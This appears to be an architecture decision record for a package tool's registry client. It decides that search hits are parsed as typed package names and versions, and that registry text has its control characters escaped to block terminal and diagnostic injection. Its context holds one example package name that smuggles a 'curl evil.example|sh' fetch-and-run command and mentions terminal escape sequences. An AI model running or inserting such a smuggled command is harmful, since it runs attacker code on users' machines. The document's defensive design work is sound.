# A search hit is a package name at the wire, and a registry's text is printable

**Status:** accepted (2026-10-23, architecture round 26, plan 02). **Amended by [ADR 0245](0245-a-registry-error-is-written-printable-whole.md) (architecture round 27, plan 03):** D4: `RegistryError::to_diagnostic` writes its whole message and suggestion printable, not field by field. Extends [ADR 0036](0036-one-package-name.md) D1 and
[ADR 0044](0044-the-package-registry-contract-is-one-crate.md) D2 and D4.

## Context

- A search reply was an entry point ADR 0036 D1 never named. `SearchHit` held its name and version as `String`; a hit
  named `@sdk/greet; curl evil.example|sh` was listed as an installable extension, and a name, version or description
  carrying `ESC[2J`, an OSC title write and BEL reached the terminal byte for byte. The in-memory adapter could only
  answer a `PackageName`: the two adapters behind the `Registry` port told different facts, and the contract could not see it.
- The same raw text reached every diagnostic that quotes a registry (R001, R002, R005, R008, R009, R-OPS-002, R-OPS-004,
  R-TRUST-004, R014), on the CLI, in its JSON and in the MCP `add_extension` reply. A newline in it forged a `hint:` line.
- Versions of one name found in two registries sorted as text: `10.0.0` before `9.0.0`.

```text
BEFORE  {"name":"@sdk/greet; ..."} -> SearchHit{String} -> Found{String} -> listed   registry text -> format!("{message}")
AFTER   {"name":"@sdk/greet; ..."} -> SearchHit{PackageName} x -> R009               registry text -> printable(text)
```

## Decisions

- **D1.** A search hit holds a `PackageName` and a SemVer `Version` at the wire. A reply holding another is not the
  call's wire type: R009, that registry's failure, the others still asked (ADR 0044 D2 as amended). The JSON is unchanged.
- **D2.** The reference server and the in-memory client serve no stored row a client could not read (a database from
  before ADR 0036 may hold one); they skip it rather than answer a 500.
- **D3.** `Found` holds the same two types and is built by `Found::new` in both adapters; versions sort by precedence.
- **D4.** Registry text is written printable where it enters a message or a listing: `RegistryError::to_diagnostic`,
  `verify_registry_integrity`, `reply_names`, `declaration_names`, `read_declaration`, `LockedPin::admits`, `Found::new`.
  One function, `specforge_common::remedy::printable`: each control character (newline included) and each bidirectional
  control as its `\u{..}` escape. Escaped, never stripped, so a reader sees that something was there and JSON and MCP
  carry the same harmless text. The port contract holds every adapter to it (R-S3).
- **D5.** `PackageMetadata` and `VersionList` stay text: the request is compared to them before any use, and the
  signature covers them as text.

## Rejected

- Escaping in the human renderers: JSON and MCP stay raw, and a renderer cannot tell a message's own newline from a forged one.
- Stripping control characters: it hides that the registry sent something odd.
- Dropping the bad hit and warning: a second list beside `Searched.failures`, for a registry that is broken or hostile.
- A `Printable` newtype: it would ripple through every `Diagnostic` literal for the same guarantee.
- `semver`'s serde feature in the root `[workspace.dependencies]`: it is a blob input; it is named on `specforge-package`.

## Consequences

- JSON shapes are unchanged; hostile text changes wording on every surface. A pre-0036 registry row disappears from search.
- A later message that quotes registry text must call `printable`, as a value parsed where it enters must be (ADR 0036 D1).

## What would reopen it

- A registry protocol that carries rich text (Markdown descriptions).
- Extension-supplied text (pass diagnostics, command output) reaches the terminal raw; it gets the same function at its own entry points.
